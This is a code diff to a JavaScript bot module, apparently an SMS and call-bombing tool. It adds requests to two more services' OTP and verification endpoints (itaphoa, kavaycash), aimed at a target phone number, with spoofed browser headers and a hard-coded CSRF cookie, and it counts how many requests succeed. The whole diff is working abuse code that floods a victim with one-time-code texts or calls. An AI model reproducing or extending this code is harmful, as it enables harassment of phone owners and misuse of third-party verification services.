@@ -122,6 +122,49 @@ module.exports = {
       pkg_name: 'com.qcvivo.vivohanh5',
     };
 
+        const itaphoaHeaders = {
+      'authority': 'api.itaphoa.com',
+      'accept': 'application/json',
+      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+      'dnt': '1',
+      'origin': 'https://shop.mioapp.vn',
+      'referer': 'https://shop.mioapp.vn/',
+      'region-code': 'HCM',
+      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Windows"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'cross-site',
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+    };
+
+    const itaphoaParams = {
+      phone: phone,
+      type: 'call',
+    };
+
+        const kavayCookies = {
+      'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
+      'tel': phone,
+    };
+
+    const kavayHeaders = {
+      'Host': 'kavaycash.com',
+      'Connection': 'keep-alive',
+      'Cache-Control': 'max-age=0',
+      'Upgrade-Insecure-Requests': '1',
+      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'X-Requested-With': 'mark.via.gp',
+      'Sec-Fetch-Site': 'same-origin',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-User': '?1',
+      'Sec-Fetch-Dest': 'document',
+      'Referer': 'https://kavaycash.com/',
+      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    };
+
 
     // Initial message to be edited later
     let messageID = null;
@@ -155,14 +198,22 @@ module.exports = {
           headers: vivohanHeaders,
           withCredentials: true,
           cookies: vivohanCookies,
+        }), 
+        axios.get('https://api.itaphoa.com/customer/send-gen-otp', {
+          params: itaphoaParams,
+          headers: itaphoaHeaders
+        }), 
+        axios.get('https://kavaycash.com/verification/', {
+          headers: kavayHeaders,
+          cookies: kavayCookies
         })
       ])
       .then(() => {
-        successCount += 4;
+        successCount += 6;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 4;
+        failureCount += 6;
         updateMessage();
       });
     };
